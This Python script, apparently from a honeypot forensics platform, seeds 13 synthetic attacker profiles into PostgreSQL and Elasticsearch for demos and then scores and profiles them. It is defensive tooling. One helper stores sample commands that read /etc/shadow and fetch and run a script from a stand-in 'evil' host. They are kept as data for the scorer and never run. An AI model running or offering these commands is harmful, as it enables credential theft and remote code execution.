#!/usr/bin/env python3
"""
demo_inject_attackers.py — seed 13 tiered attacker scenarios for end-to-end demos.

Inserts synthetic forensic_sessions + ip_enrichment_cache rows directly into
PostgreSQL, and synthetic honeypot events into Elasticsearch (honeypot-logs-*),
then (optionally) re-scores each row with risk_score.score_session() and
re-profiles each IP with AttackerProfiler.profile_ip().

Tiers:
   3 expert  — Tor / bulletproof / known C2, multi-honeypot, YARA + VT hits
   4 medium  — VPN / datacenter / scanners, 2 honeypots, brute-force
   3 amateur — residential / cheap VPS, 1 honeypot, default creds
   1 insider-expert — RFC1918 privileged employee, /etc/shadow exfil
   1 TN-medium      — Tunisie Telecom ASN, deliberate well-resourced actor
   1 insider-amateur — RFC1918 lateral-movement attempt on SMB

Usage (inside forenhive-forensic-engine container):
   python demo_inject_attackers.py                       # seed + rescore + profile
   python demo_inject_attackers.py --tiers expert,medium # seed subset
   python demo_inject_attackers.py --purge               # delete prior demo rows
   python demo_inject_attackers.py --no-profile          # skip Mistral profiling
"""
from __future__ import annotations

import argparse
import hashlib
import json
import logging
import sys
import time
import uuid
from datetime import UTC, datetime, timedelta

import config
import db_pool
from elasticsearch import Elasticsearch
from risk_score import SCORE_VERSION, score_session
from risk_thresholds import risk_level

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("demo_inject")


# ─────────────────────────────────────────────────────────────────────────────
# ATTACKER SCENARIOS — 13 deterministic profiles spanning every tier
# ─────────────────────────────────────────────────────────────────────────────

ATTACKERS = [
    # ── EXPERT tier (3) — multi-honeypot, YARA + VT, MITRE T1486/T1552 ──────
    {
        "ip": "185.220.101.5", "tier": "expert", "label": "Tor exit (DE)",
        "honeypots": ["cowrie", "dionaea", "galah"],
        "abuse_score": 100, "abuse_total_reports": 1842, "vt_malicious": 38,
        "vt_family": "Mirai", "is_tor": True, "is_vpn": False,
        "country": "DE", "country_name": "Germany",
        "city": "Berlin", "lat": 52.5200, "lon": 13.4050,
        "asn": 6695, "org": "Tor Exit",
        "duration_min": 47, "login_attempts": 184, "success_count": 3,
        "command_count": 42, "exfil_bytes": 1_240_000, "file_download_count": 6,
        "smb_share_enum": True, "epmapper_prescan": 12, "exploit_cve": ["CVE-2017-0144"],
        "yara_matches": ["mirai_botnet", "ssh_persistence"],
        "command_quality_tags": ["credential_access", "destructive", "lateral",
                                 "anti_forensics", "persistence"],
        "destination_port": 445,
    },
    {
        "ip": "45.227.255.206", "tier": "expert", "label": "Bulletproof host (RU)",
        "honeypots": ["cowrie", "dionaea"],
        "abuse_score": 97, "abuse_total_reports": 967, "vt_malicious": 24,
        "vt_family": "Cobalt Strike", "is_tor": False, "is_vpn": True,
        "country": "RU", "country_name": "Russia",
        "city": "Moscow", "lat": 55.7558, "lon": 37.6173,
        "asn": 209605, "org": "QHoster",
        "duration_min": 38, "login_attempts": 92, "success_count": 2,
        "command_count": 38, "exfil_bytes": 880_000, "file_download_count": 4,
        "smb_share_enum": True, "epmapper_prescan": 8, "exploit_cve": ["CVE-2020-1472"],
        "yara_matches": ["cobalt_strike_beacon", "credential_harvester"],
        "command_quality_tags": ["credential_access", "lateral", "anti_forensics"],
        "destination_port": 445,
    },
    {
        "ip": "194.165.16.11", "tier": "expert", "label": "WannaCry historical C2",
        "honeypots": ["cowrie", "dionaea", "galah"],
        "abuse_score": 100, "abuse_total_reports": 2104, "vt_malicious": 56,
        "vt_family": "WannaCry", "is_tor": False, "is_vpn": False, "is_proxy": True,
        "country": "RU", "country_name": "Russia",
        "city": "Saint Petersburg", "lat": 59.9311, "lon": 30.3609,
        "asn": 60068, "org": "Datacamp",
        "duration_min": 62, "login_attempts": 220, "success_count": 5,
        "command_count": 51, "exfil_bytes": 2_400_000, "file_download_count": 8,
        "smb_share_enum": True, "epmapper_prescan": 18, "exploit_cve": ["CVE-2017-0144"],
        "yara_matches": ["wannacry_ransomware", "smb_exploit"],
        "command_quality_tags": ["destructive", "credential_access", "lateral",
                                 "persistence", "anti_forensics"],
        "destination_port": 445,
    },

    # ── MEDIUM tier (4) — VPN/scanner, 2 honeypots, brute-force ─────────────
    {
        "ip": "80.82.77.33", "tier": "medium", "label": "Censys scanner",
        "honeypots": ["dionaea", "galah"],
        "abuse_score": 78, "abuse_total_reports": 412, "vt_malicious": 6,
        "vt_family": "", "is_datacenter": True,
        "country": "NL", "country_name": "Netherlands",
        "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041,
        "asn": 202425, "org": "IP Volume",
        "duration_min": 12, "login_attempts": 32, "success_count": 0,
        "command_count": 4, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": False, "epmapper_prescan": 2, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": ["reconnaissance"],
        "destination_port": 1433,
    },
    {
        "ip": "92.118.39.18", "tier": "medium", "label": "NordVPN exit",
        "honeypots": ["cowrie", "galah"],
        "abuse_score": 64, "abuse_total_reports": 230, "vt_malicious": 3,
        "vt_family": "", "is_vpn": True,
        "country": "PA", "country_name": "Panama",
        "city": "Panama City", "lat": 8.9824, "lon": -79.5199,
        "asn": 60068, "org": "NordVPN",
        "duration_min": 18, "login_attempts": 58, "success_count": 1,
        "command_count": 12, "exfil_bytes": 14_200, "file_download_count": 1,
        "smb_share_enum": False, "epmapper_prescan": 0, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": ["reconnaissance", "credential_access"],
        "destination_port": 22,
    },
    {
        "ip": "141.98.10.62", "tier": "medium", "label": "Mass-scan datacenter",
        "honeypots": ["dionaea", "galah"],
        "abuse_score": 70, "abuse_total_reports": 318, "vt_malicious": 2,
        "vt_family": "", "is_datacenter": True,
        "country": "LT", "country_name": "Lithuania",
        "city": "Vilnius", "lat": 54.6872, "lon": 25.2797,
        "asn": 209605, "org": "UAB Host",
        "duration_min": 9, "login_attempts": 26, "success_count": 0,
        "command_count": 3, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": False, "epmapper_prescan": 4, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": ["reconnaissance"],
        "destination_port": 3306,
    },
    {
        "ip": "5.188.10.156", "tier": "medium", "label": "Brute-force botnet (RU)",
        "honeypots": ["cowrie", "dionaea"],
        "abuse_score": 82, "abuse_total_reports": 524, "vt_malicious": 4,
        "vt_family": "Generic.Botnet", "is_datacenter": True,
        "country": "RU", "country_name": "Russia",
        "city": "Moscow", "lat": 55.7558, "lon": 37.6173,
        "asn": 35415, "org": "Webzilla",
        "duration_min": 22, "login_attempts": 71, "success_count": 1,
        "command_count": 9, "exfil_bytes": 8_400, "file_download_count": 1,
        "smb_share_enum": False, "epmapper_prescan": 1, "exploit_cve": [],
        "yara_matches": ["generic_dropper"],
        "command_quality_tags": ["credential_access"],
        "destination_port": 22,
    },

    # ── AMATEUR tier (3) — residential, single honeypot, default creds ──────
    {
        "ip": "41.230.42.17", "tier": "amateur", "label": "Residential TN",
        "honeypots": ["cowrie"],
        "abuse_score": 14, "abuse_total_reports": 12, "vt_malicious": 0,
        "vt_family": "",
        "country": "TN", "country_name": "Tunisia",
        "city": "Tunis", "lat": 36.8065, "lon": 10.1815,
        "asn": 2609, "org": "Tunisie Telecom",
        "duration_min": 1, "login_attempts": 5, "success_count": 0,
        "command_count": 0, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": False, "epmapper_prescan": 0, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": [],
        "destination_port": 22,
    },
    {
        "ip": "197.0.5.12", "tier": "amateur", "label": "Residential TN (Ooredoo)",
        "honeypots": ["cowrie"],
        "abuse_score": 8, "abuse_total_reports": 4, "vt_malicious": 0,
        "vt_family": "",
        "country": "TN", "country_name": "Tunisia",
        "city": "Sfax", "lat": 34.7406, "lon": 10.7603,
        "asn": 37705, "org": "Ooredoo TN",
        "duration_min": 1, "login_attempts": 3, "success_count": 0,
        "command_count": 0, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": False, "epmapper_prescan": 0, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": [],
        "destination_port": 22,
    },
    {
        "ip": "188.166.13.4", "tier": "amateur", "label": "DigitalOcean droplet",
        "honeypots": ["galah"],
        "abuse_score": 22, "abuse_total_reports": 38, "vt_malicious": 0,
        "vt_family": "", "is_datacenter": True,
        "country": "GB", "country_name": "United Kingdom",
        "city": "London", "lat": 51.5074, "lon": -0.1278,
        "asn": 14061, "org": "DigitalOcean",
        "duration_min": 2, "login_attempts": 4, "success_count": 0,
        "command_count": 2, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": False, "epmapper_prescan": 0, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": ["reconnaissance"],
        "destination_port": 8080,
    },

    # ── INSIDER tier (2) — RFC1918, INSIDER_THREAT alert path ───────────────
    {
        "ip": "10.212.50.5", "tier": "insider_expert", "label": "Privileged employee",
        "honeypots": ["cowrie", "dionaea"], "is_private": True,
        "abuse_score": 0, "abuse_total_reports": 0, "vt_malicious": 0,
        "vt_family": "",
        "country": "", "country_name": "", "asn": 0, "org": "Internal — 10.212.0.0/16",
        "duration_min": 53, "login_attempts": 8, "success_count": 6,
        "command_count": 47, "exfil_bytes": 3_800_000, "file_download_count": 5,
        "smb_share_enum": True, "epmapper_prescan": 6, "exploit_cve": [],
        "yara_matches": ["credential_harvester"],
        "command_quality_tags": ["credential_access", "destructive", "exfiltration",
                                 "anti_forensics", "lateral"],
        "destination_port": 445,
    },
    {
        "ip": "10.212.50.20", "tier": "insider_amateur",
        "label": "Insider lateral-movement attempt",
        "honeypots": ["dionaea"], "is_private": True,
        "abuse_score": 0, "abuse_total_reports": 0, "vt_malicious": 0,
        "vt_family": "",
        "country": "", "country_name": "", "asn": 0, "org": "Internal — 10.212.0.0/16",
        "duration_min": 7, "login_attempts": 14, "success_count": 0,
        "command_count": 0, "exfil_bytes": 0, "file_download_count": 0,
        "smb_share_enum": True, "epmapper_prescan": 3, "exploit_cve": [],
        "yara_matches": [],
        "command_quality_tags": ["reconnaissance"],
        "destination_port": 445,
    },

    # ── TN-focused medium tier (1) — deliberate well-resourced TN actor ─────
    {
        "ip": "41.231.53.40", "tier": "medium_tn", "label": "TN-based actor (Tunisie Telecom)",
        "honeypots": ["cowrie", "dionaea", "galah"],
        "abuse_score": 58, "abuse_total_reports": 142, "vt_malicious": 2,
        "vt_family": "", "is_vpn": True,
        "country": "TN", "country_name": "Tunisia",
        "city": "Tunis", "lat": 36.8065, "lon": 10.1815,
        "asn": 2609, "org": "Tunisie Telecom",
        "duration_min": 28, "login_attempts": 64, "success_count": 2,
        "command_count": 21, "exfil_bytes": 92_000, "file_download_count": 2,
        "smb_share_enum": True, "epmapper_prescan": 5, "exploit_cve": [],
        "yara_matches": ["generic_recon"],
        "command_quality_tags": ["reconnaissance", "credential_access", "lateral"],
        "destination_port": 22,
    },
]

ALL_IPS = [a["ip"] for a in ATTACKERS]


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _now_utc() -> datetime:
    return datetime.now(UTC)


def _session_id(ip: str, hp: str, idx: int) -> str:
    seed = f"demo-{ip}-{hp}-{idx}".encode()
    return f"demo-{hashlib.sha1(seed).hexdigest()[:16]}"


def _build_session_data(attacker: dict, hp: str, started_at: datetime,
                        ended_at: datetime) -> dict:
    """Produce a dict shaped for risk_score.score_session()."""
    duration_sec = max((ended_at - started_at).total_seconds(), 1)
    velocity = attacker["login_attempts"] / duration_sec if duration_sec else 0.0

    # Synthesize a per-honeypot command list (just markers — scorer reads tags).
    commands = []
    if hp == "cowrie" and attacker["command_count"]:
        commands = ["uname -a", "cat /etc/shadow", "wget http://evil/x.sh",
                    "chmod +x x.sh", "./x.sh"][:attacker["command_count"] or 1]

    return {
        # WHO
        "source_ip": attacker["ip"],
        "is_private": bool(attacker.get("is_private")),
        "abuse_score": attacker["abuse_score"],
        "abuse_total_reports": attacker["abuse_total_reports"],
        "abuse_distinct_users": attacker["abuse_total_reports"] // 4,
        "is_tor": bool(attacker.get("is_tor")),
        "is_vpn": bool(attacker.get("is_vpn")),
        "is_proxy": bool(attacker.get("is_proxy")),
        "is_datacenter": bool(attacker.get("is_datacenter")),
        "is_bogon": False,
        "is_abuser_listed": attacker["abuse_score"] >= 80,
        "threat_tier": "high" if attacker["abuse_score"] >= 80 else "",
        "geo_country_code": attacker["country"],
        "geo_asn": attacker["asn"],
        "geo_org": attacker["org"],
        "previously_seen": False,
        "previous_sessions": 0,
        # WHAT
        "honeypot_type": hp,
        "login_attempts": attacker["login_attempts"],
        "success_count": attacker["success_count"],
        "attack_velocity": velocity,
        "command_count": attacker["command_count"],
        "commands": commands,
        "command_quality_tags": list(attacker["command_quality_tags"]),
        "exfil_bytes": attacker["exfil_bytes"],
        "file_download_count": attacker["file_download_count"],
        "smb_share_enum": attacker["smb_share_enum"],
        "epmapper_prescan": attacker["epmapper_prescan"],
        "exploit_cve": list(attacker["exploit_cve"]),
        "destination_port": attacker["destination_port"],
        # HOW
        "yara_matches": list(attacker["yara_matches"]),
        "vt_malicious": attacker["vt_malicious"],
        "vt_family": attacker["vt_family"],
        # Time
        "session_duration_sec": duration_sec,
    }


def _build_enrichment(attacker: dict) -> dict:
    """Synthetic enrichment_data blob — mirrors enricher.py output shape.
    Geo block uses the same keys (`country`, `city`, `lat`, `lon`) that the
    backend geo router queries in backend/routers/geo.py."""
    geo: dict = {
        "country_code": attacker["country"],
        "country": attacker["country_name"],
        "asn": attacker["asn"],
        "org": attacker["org"],
    }
    # Public IPs only: emit lat/lon/city so they land on the geomap.
    if not attacker.get("is_private") and attacker.get("lat") is not None:
        geo["lat"] = attacker["lat"]
        geo["lon"] = attacker["lon"]
        geo["city"] = attacker.get("city", "")
    return {
        "reputation": {
            "abuse_score": attacker["abuse_score"],
            "total_reports": attacker["abuse_total_reports"],
            "distinct_users": attacker["abuse_total_reports"] // 4,
            "country_code": attacker["country"],
            "country_name": attacker["country_name"],
        },
        "geo": geo,
        "threat_summary": {
            "is_tor": bool(attacker.get("is_tor")),
            "is_vpn": bool(attacker.get("is_vpn")),
            "is_proxy": bool(attacker.get("is_proxy")),
            "is_datacenter": bool(attacker.get("is_datacenter")),
            "is_bogon": False,
            "is_abuser_listed": attacker["abuse_score"] >= 80,
            "tier": "high" if attacker["abuse_score"] >= 80 else
                    ("medium" if attacker["abuse_score"] >= 40 else "low"),
            "attack_categories": attacker["command_quality_tags"],
        },
        "privacy": {
            "is_tor": bool(attacker.get("is_tor")),
            "is_vpn": bool(attacker.get("is_vpn")),
        },
        "infrastructure": {"vulns": []},
        "is_private": bool(attacker.get("is_private")),
        "private_risk_level": "high" if attacker.get("is_private") else None,
        "network_class": "vpn_or_internal" if attacker.get("is_private") else "public",
        "is_docker": False,
        "demo": True,
    }


# ─────────────────────────────────────────────────────────────────────────────
# WRITES
# ─────────────────────────────────────────────────────────────────────────────

SESSION_UPSERT = """
INSERT INTO forensic_sessions
    (session_id, honeypot_type, source_ip, started_at, ended_at,
     risk_score, risk_level, confidence,
     mitre_techniques, enrichment_data, signal_breakdown,
     kill_chain_phase, kill_chain_stage,
     primary_technique, forensic_narrative,
     login_attempts, success_count, attack_velocity,
     score_version, created_at, updated_at)
VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,NOW(),NOW())
ON CONFLICT (session_id) DO UPDATE SET
    risk_score=EXCLUDED.risk_score,
    risk_level=EXCLUDED.risk_level,
    confidence=EXCLUDED.confidence,
    enrichment_data=EXCLUDED.enrichment_data,
    signal_breakdown=EXCLUDED.signal_breakdown,
    mitre_techniques=EXCLUDED.mitre_techniques,
    kill_chain_phase=EXCLUDED.kill_chain_phase,
    kill_chain_stage=EXCLUDED.kill_chain_stage,
    primary_technique=EXCLUDED.primary_technique,
    forensic_narrative=EXCLUDED.forensic_narrative,
    login_attempts=EXCLUDED.login_attempts,
    success_count=EXCLUDED.success_count,
    attack_velocity=EXCLUDED.attack_velocity,
    score_version=EXCLUDED.score_version,
    updated_at=NOW()
"""

ENRICHMENT_UPSERT = """
INSERT INTO ip_enrichment_cache (ip, data, cached_at, expires_at)
VALUES (%s, %s, NOW(), NOW() + INTERVAL '24 hours')
ON CONFLICT (ip) DO UPDATE SET
    data=EXCLUDED.data, cached_at=NOW(), expires_at=EXCLUDED.expires_at
"""


def _mitre_for_tier(attacker: dict) -> tuple[list[str], str, int]:
    """Pick MITRE techniques + kill-chain phase per tier."""
    t = attacker["tier"]
    if t in ("expert", "insider_expert"):
        return (["T1110.001", "T1078", "T1552.001", "T1021.002", "T1486"],
                "actions_on_objectives", 7)
    if t in ("medium", "medium_tn"):
        return (["T1110.003", "T1078", "T1021.002"], "lateral_movement", 5)
    if t == "insider_amateur":
        return (["T1110.001", "T1021.002"], "discovery", 3)
    # amateur
    return (["T1110.001"], "credential_access", 4)


def seed_attacker(pg, es: Elasticsearch, attacker: dict) -> list[str]:
    """Insert one PG row per honeypot the attacker hit + matching ES events.

    Returns the list of session_ids created (one per honeypot)."""
    now = _now_utc()
    session_ids: list[str] = []
    techniques, kill_chain_phase, kill_chain_stage = _mitre_for_tier(attacker)
    enrichment = _build_enrichment(attacker)

    for idx, hp in enumerate(attacker["honeypots"]):
        started_at = now - timedelta(minutes=attacker["duration_min"] + idx)
        ended_at = started_at + timedelta(minutes=attacker["duration_min"])
        sd = _build_session_data(attacker, hp, started_at, ended_at)

        # Score via real scorer so signal_breakdown matches the engine.
        result = score_session(sd)

        sid = _session_id(attacker["ip"], hp, idx)
        session_ids.append(sid)

        ed = {
            **enrichment,
            "risk_level": result.risk_level,
            "confidence": result.confidence,
            "score_version": result.score_version,
            "signal_breakdown": result.signal_breakdown,
            "active_signals": result.active_signals,
            "command_count": sd["command_count"],
            "file_download_count": sd["file_download_count"],
            "exfil_bytes": sd["exfil_bytes"],
            "mitre_techniques": techniques,
            "kill_chain_phase": kill_chain_phase,
            "kill_chain_stage": kill_chain_stage,
            "primary_technique": techniques[0] if techniques else None,
            "yara_matches": sd["yara_matches"],
            "vt_malicious": sd["vt_malicious"],
            "vt_family": sd["vt_family"],
            "smb_share_enum": sd["smb_share_enum"],
            "epmapper_prescan": sd["epmapper_prescan"],
            "exploit_cve": sd["exploit_cve"],
            "demo_tier": attacker["tier"],
            "demo_label": attacker["label"],
        }

        narrative = (f"[{attacker['tier'].upper()}] {attacker['label']} — "
                     f"{attacker['login_attempts']} attempts over "
                     f"{attacker['duration_min']} min on {hp}. "
                     f"{'Multi-honeypot.' if len(attacker['honeypots']) > 1 else ''}")

        with pg.cursor() as cur:
            cur.execute(SESSION_UPSERT, (
                sid, hp, attacker["ip"], started_at, ended_at,
                result.risk_score, result.risk_level, result.confidence,
                json.dumps(techniques),
                json.dumps(ed),
                json.dumps(result.signal_breakdown),
                kill_chain_phase, kill_chain_stage,
                techniques[0] if techniques else None,
                narrative,
                attacker["login_attempts"], attacker["success_count"],
                sd["attack_velocity"],
                SCORE_VERSION,
            ))

        log.info(f"  PG: {hp:8s} {attacker['ip']:18s} → score={result.risk_score:3d} "
                 f"({result.risk_level}) sid={sid[:12]}")

        # Write raw honeypot event to ES — picked up by Stats/profiling pages.
        _write_es_event(es, attacker, hp, sid, started_at, sd)

    # Per-IP enrichment cache row.
    with pg.cursor() as cur:
        cur.execute(ENRICHMENT_UPSERT, (attacker["ip"], json.dumps(enrichment)))

    return session_ids


def _write_es_event(es: Elasticsearch, attacker: dict, hp: str, sid: str,
                    ts: datetime, sd: dict) -> None:
    """Write a single normalized event into honeypot-logs-YYYY.MM.dd."""
    index = f"honeypot-logs-{ts.strftime('%Y.%m.%d')}"
    doc = {
        "@timestamp": ts.isoformat(),
        "source": {"ip": attacker["ip"], "geo": {
            "country_iso_code": attacker["country"],
            "country_name": attacker["country_name"],
        }},
        "destination": {"port": sd["destination_port"]},
        "honeypot": {"type": hp},
        "event": {
            "category": "authentication" if hp == "cowrie" else
                        ("web" if hp == "galah" else "network"),
            "action": "demo_session",
            "outcome": "success" if sd["success_count"] else "failure",
        },
        "session": {"id": sid},
        "user": {"name": "root"},
        "demo": {"tier": attacker["tier"], "label": attacker["label"]},
        "tags": [hp, "demo_injection"],
    }
    try:
        es.index(index=index, document=doc)
    except Exception as e:
        log.warning(f"ES index {index} failed for {attacker['ip']}: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def purge(pg) -> None:
    """Delete all rows belonging to demo IPs (idempotent)."""
    ips = tuple(ALL_IPS)
    with pg.cursor() as cur:
        cur.execute("DELETE FROM forensic_sessions WHERE source_ip IN %s", (ips,))
        deleted_sessions = cur.rowcount
        cur.execute("DELETE FROM ip_enrichment_cache WHERE ip IN %s", (ips,))
        deleted_cache = cur.rowcount
        cur.execute("DELETE FROM suspect_profiles WHERE source_ip IN %s", (ips,))
        deleted_profiles = cur.rowcount
        cur.execute("DELETE FROM forensic_timeline_events WHERE source_ip IN %s", (ips,))
        deleted_timeline = cur.rowcount
    log.info(f"Purged: sessions={deleted_sessions} cache={deleted_cache} "
             f"profiles={deleted_profiles} timeline={deleted_timeline}")


def run_profiling(es: Elasticsearch, ips: list[str]) -> None:
    """Call AttackerProfiler.profile_ip() for each IP — uses Mistral, slow."""
    from profiler import AttackerProfiler
    profiler = AttackerProfiler(es, pg_conn_factory=db_pool.pooled_conn)
    for ip in ips:
        log.info(f"  profiling {ip} …")
        try:
            profile = profiler.profile_ip(ip)
            soph = profile.get("sophistication", "?")
            log.info(f"    → sophistication={soph} risk={profile.get('risk_score', 0)}")
        except Exception as e:
            log.warning(f"    profile failed: {e}")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    ap.add_argument("--tiers", default="",
                    help="Comma-separated subset: expert,medium,amateur,"
                         "insider_expert,insider_amateur,medium_tn (default: all)")
    ap.add_argument("--purge", action="store_true", help="Delete prior demo rows and exit.")
    ap.add_argument("--no-profile", action="store_true",
                    help="Skip the Mistral profiling pass (saves several minutes).")
    args = ap.parse_args()

    pg = db_pool.pooled_conn()
    if args.purge:
        purge(pg)
        pg.commit()
        pg.close()
        return 0

    selected = ATTACKERS
    if args.tiers:
        wanted = {t.strip() for t in args.tiers.split(",") if t.strip()}
        selected = [a for a in ATTACKERS if a["tier"] in wanted]
        if not selected:
            log.error(f"No attackers matched tiers={wanted}")
            return 1

    es = Elasticsearch(f"http://{config.ES_HOST}:{config.ES_PORT}", request_timeout=30)
    log.info(f"Seeding {len(selected)} attackers across "
             f"{sum(len(a['honeypots']) for a in selected)} honeypot sessions …")

    t0 = time.time()
    for attacker in selected:
        seed_attacker(pg, es, attacker)
    pg.commit()
    log.info(f"Seeded in {time.time() - t0:.1f}s")

    es.indices.refresh(index="honeypot-logs-*", ignore_unavailable=True)

    if not args.no_profile:
        log.info("Running profiler pass (Mistral) — this can take a few minutes …")
        run_profiling(es, [a["ip"] for a in selected])

    pg.close()
    log.info("Done. Verify with:")
    log.info("  psql -c \"SELECT source_ip, risk_score, risk_level FROM "
             "forensic_sessions WHERE source_ip IN (...) ORDER BY risk_score DESC;\"")
    return 0


if __name__ == "__main__":
    sys.exit(main())
